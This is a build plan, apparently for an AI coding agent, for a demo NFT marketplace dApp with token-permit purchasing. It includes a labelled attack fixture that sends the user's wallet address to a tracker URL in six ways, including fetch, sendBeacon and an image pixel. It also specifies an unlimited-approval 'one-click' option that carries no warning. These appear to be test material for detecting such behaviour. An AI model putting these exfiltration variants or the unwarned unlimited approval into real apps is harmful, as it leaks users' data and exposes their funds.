# GEMINI PLAN — PermitMarket (do the steps in order; tick each one)

Read `docs/apps/GEMINI_INSTRUCTIONS.md` first, then `docs/apps/PERMITMARKET.md`. Folder: `apps/demos/permitmarket/` only. Test chain port 9130, preview 9131, tracker stub 9132.

## Step 1 — create the files
```
apps/demos/permitmarket/index.html  vite.config.ts  tsconfig.json
apps/demos/permitmarket/src/vite-env.d.ts  main.ts  style.css  abi.ts  ui.ts  state.ts  art.ts
apps/demos/permitmarket/src/lib/{config,wallet,tx,format,errors}.ts
apps/demos/permitmarket/src/sections/{header,market,buyDialog,myItems,faucet,contracts}.ts
apps/demos/permitmarket/fixtures/leak.html
apps/demos/permitmarket/fixtures/leak.ts
apps/demos/permitmarket/test/config.local.json  test/smoke.md  test/tracker-stub.mjs  test/no-tracker-check.mjs
```
`fixtures/` must NEVER be imported by `index.html` or anything in `src/`. `leak.ts` may import from `../src/lib/*` (config/wallet only).

## Step 2 — `src/abi.ts` (confirm against PermitMarketplace.sol, DemoNFT.sol, DemoToken.sol)
```ts
import { parseAbi } from "viem";
export const marketAbi = parseAbi([
  "struct Listing { address seller; bool active; uint256 tokenId; uint256 price; }",
  "function listingCount() view returns (uint256)",
  "function listingsPage(uint256 firstId, uint256 count) view returns (Listing[])",
  "function isBuyable(uint256 listingId) view returns (bool)",
  "function activeListingOf(uint256 tokenId) view returns (uint256)",
  "function list(uint256 tokenId, uint256 price) returns (uint256)",
  "function cancel(uint256 listingId)",
  "function buy(uint256 listingId)",
  "function buyWithPermit(uint256 listingId, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
  "error ZeroAddress()", "error ZeroPrice()", "error NotTokenOwner(uint256 tokenId)",
  "error MarketplaceNotApproved(uint256 tokenId)", "error AlreadyListed(uint256 tokenId, uint256 listingId)",
  "error ListingNotActive(uint256 listingId)", "error NotSeller(uint256 listingId)",
  "error SellerIsBuyer(uint256 listingId)", "error StaleListing(uint256 listingId)",
  "error PermitAllowanceTooLow(uint256 allowance, uint256 price)",
]);
export const nftAbi = parseAbi([
  "function mint() returns (uint256)", "function totalMinted() view returns (uint256)",
  "function mintedBy(address) view returns (uint256)", "function MAX_PER_ACCOUNT() view returns (uint256)",
  "function ownerOf(uint256) view returns (address)", "function balanceOf(address) view returns (uint256)",
  "function isApprovedForAll(address owner, address operator) view returns (bool)",
  "function setApprovalForAll(address operator, bool approved)",
  "error MintLimit()",
]);
export const tokenAbi = /* VaultLab tokenAbi */ + also:
  "function nonces(address) view returns (uint256)", "function name() view returns (string)", "function DOMAIN_SEPARATOR() view returns (bytes32)"
```
Listing ids run from 1 to `listingCount()`. Token ids run from 1 to `totalMinted()`. ERROR_TEXT: one plain sentence for every error above (e.g. `SellerIsBuyer: "You can't buy your own listing."`, `MintLimit: "You've minted the maximum of 5 passes."`, `MarketplaceNotApproved: "First allow the marketplace to transfer your NFTs."`).
Config keys: `contract("marketplace")`, `contract("token")`, `contract("nft")`.

## Step 3 — `src/art.ts`
`passSvg(tokenId: bigint): string` → deterministic 240×240 SVG: background hue = `Number(tokenId * 47n % 360n)`, 3 concentric circles with hues +40/+80, text "PASS #<id>". Return a `data:image/svg+xml;utf8,` URI (encodeURIComponent). No external images.

## Step 4 — `src/state.ts`
`refresh()`: `listingCount`, then `listingsPage(1, min(count, 100))` (paginate if more: firstId 101…), token `decimals/symbol/name`; connected: token `balanceOf, allowance(user, MARKET), nonces(user), lastFaucetAt(user)`; nft `totalMinted, mintedBy(user), isApprovedForAll(user, MARKET)`; owned tokens = for id in 1..totalMinted, `ownerOf(id)` (use Promise.all in chunks of 20) where owner == user. Poll every 15 s + after every tx.

## Step 5 — sections
1. **header.ts** — "PermitMarket", network badge, pUSD balance when connected, wallet connect (as VaultLab).
2. **market.ts** — grid of active listings (`active && isBuyable`): SVG art, "Pass #id", price `fmt(price, 6) pUSD`, seller `short()`, Buy button (disabled + title "This is your listing" when seller == user; "Connect your wallet first" when disconnected). Empty state: "No passes for sale yet — mint one in My items and list it."
3. **buyDialog.ts** — `<dialog>` for one listing with THREE options, in this order and wording:
   - **"Enable one-click buying (recommended)"** — primary-styled. Step 1 `approve(MARKET, maxUint256)` (import `maxUint256` from viem; skip if allowance already ≥ price), Step 2 `buy(listingId)`. Do NOT add any warning text in the app.
   - **"Approve exact amount"** — Step 1 `approve(MARKET, price)`, Step 2 `buy(listingId)`.
   - **"Pay with a signature (permit)"** — no approve tx:
     ```ts
     const deadline = BigInt(Math.floor(Date.now() / 1000) + 20 * 60);
     const nonce = await read token.nonces(user); const name = await read token.name();
     const signature = await session.wallet.signTypedData({
       account: session.address,
       domain: { name, version: "1", chainId: getConfig().chainId, verifyingContract: TOKEN },
       types: { Permit: [ { name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" } ] },
       primaryType: "Permit",
       message: { owner: session.address, spender: MARKET, value: price, nonce, deadline },
     });
     const { v, r, s } = parseSignature(signature);  // from viem; v is bigint → Number(v)
     sendTx("Buy with permit", () => session.wallet.writeContract({ address: MARKET, abi: marketAbi, functionName: "buyWithPermit", args: [listingId, deadline, Number(v), r, s], account: session.address, chain: appChain() }), ui);
     ```
     (Confirm the permit domain `version` in OpenZeppelin ERC20Permit is "1".)
   Each option shows its own step statuses and tx links. Close button; Esc closes.
4. **myItems.ts** — "Mint a pass" → `mint()` (disabled with title when `mintedBy == MAX_PER_ACCOUNT`). Owned passes grid. If `!isApprovedForAll` show "Allow the marketplace to list your passes" → `setApprovalForAll(MARKET, true)`. Per owned pass: price input + "List" → `list(tokenId, parseAmount(price, 6))`; if already listed (`activeListingOf(id) != 0`) show "Listed at X — Cancel" → `cancel(listingId)`.
5. **faucet.ts**, **contracts.ts** — as VaultLab (contracts: Marketplace, pUSD, pNFT).

## Step 6 — attack fixture (separate page; NOT part of the app)
`fixtures/leak.html`: red banner "ATTACK FIXTURE — this page deliberately sends your wallet address to a third-party tracker. Demo only." + Connect button + 7 buttons + a log `<pre>`; loads `<script type="module" src="./leak.ts">`.
`fixtures/leak.ts`: `const TRACKER = import.meta.env.VITE_TRACKER_URL ?? "http://127.0.0.1:5190/collect";` After connect (`discoverWallets` + `connect`), buttons:
1. `fetch(TRACKER + "?addr=" + address)` (checksummed)
2. `fetch(TRACKER + "?a=" + address.slice(2).toLowerCase())`
3. `fetch(TRACKER, {method:"POST", headers:{"content-type":"application/json"}, body: JSON.stringify({wallet: address})})`
4. `fetch(TRACKER, {method:"POST", headers:{"content-type":"text/plain"}, body: btoa(address)})`
5. `navigator.sendBeacon(TRACKER, JSON.stringify({w: address}))`
6. `new Image().src = TRACKER + "?px=" + encodeURIComponent(address)`
7. "Send all" (1–6 in order). Use `mode: "no-cors"` on fetches so CORS doesn't block the demo. Log each send (method + what) into the `<pre>`. Link: "View what the tracker received" → TRACKER with `/collect` replaced by `/log`.
Build it separately for testing: `pnpm --filter @pramaan/demos exec vite build apps/demos/permitmarket --outDir dist-fixture-local --emptyOutDir -- ` is not suitable; instead create a temporary `vite.fixture.config.ts` in the app folder with `build.rollupOptions.input = "fixtures/leak.html"` and run `pnpm --filter @pramaan/demos exec vite build apps/demos/permitmarket --config apps/demos/permitmarket/vite.fixture.config.ts --outDir dist-fixture-local`. Keep that config file (the infra build may use it) but name it exactly `vite.fixture.config.ts`.

## Step 7 — test helpers
- `test/tracker-stub.mjs`: Node `http` server on 127.0.0.1:9132, accepts any method on `/collect` (adds CORS `Access-Control-Allow-Origin: *`), stores `{time, method, url, body}` in memory, `GET /log` returns them as JSON. For testing set `VITE_TRACKER_URL=http://127.0.0.1:9132/collect` before building the fixture.
- `test/no-tracker-check.mjs`: scans every file in `apps/demos/permitmarket/dist-local` (production build) and exits 1 if any contains `5190`, `9132`, `/collect`, `sendBeacon` or `leak`; prints "production build clean" otherwise.

## Step 8 — local chain test (from `contracts/`)
```powershell
$RPC = "http://127.0.0.1:9130"; $PK = "<anvil key #0>"
& "$env:USERPROFILE\.foundry\bin\forge.exe" create src/demo/DemoToken.sol:DemoToken --rpc-url $RPC --private-key $PK --broadcast
& "$env:USERPROFILE\.foundry\bin\forge.exe" create src/demo/DemoNFT.sol:DemoNFT --rpc-url $RPC --private-key $PK --broadcast
& "$env:USERPROFILE\.foundry\bin\forge.exe" create src/demo/PermitMarketplace.sol:PermitMarketplace --rpc-url $RPC --private-key $PK --broadcast --constructor-args <TOKEN> <NFT>
```
`test/config.local.json`: `"appId":"permitmarket"`, origin `http://localhost:9131`, `"contracts":{"marketplace":"<MARKET>","token":"<TOKEN>","nft":"<NFT>"}`. Use two MetaMask accounts: anvil key #1 = seller, key #2 = buyer.

## Step 9 — checklist (tx hashes in test/smoke.md)
- [ ] Seller: mint ×3, setApprovalForAll, list 3 passes (e.g. 10, 20, 30 pUSD); cancel + relist one
- [ ] Buyer: faucet; buy #1 with "one-click" → `cast call <TOKEN> "allowance(address,address)(uint256)" <buyer> <MARKET>` shows 2^256-1 minus nothing (max)
- [ ] Buyer (fresh allowance: first `approve(MARKET, 0)` via cast) buys #2 with exact approve → allowance back to 0 after purchase
- [ ] Buyer buys #3 with permit → no approve tx in MetaMask, only a signature + one tx
- [ ] Seller can't buy own listing (button disabled); sold listing disappears
- [ ] Fixture: tracker stub log shows all 6 variants
- [ ] `node apps/demos/permitmarket/test/no-tracker-check.mjs` prints "production build clean"
- [ ] index.html/src never import fixtures (search) · no hardcoded addresses · typecheck clean · 360 px · light + dark
- [ ] `dist-local` and `dist-fixture-local` deleted at the end
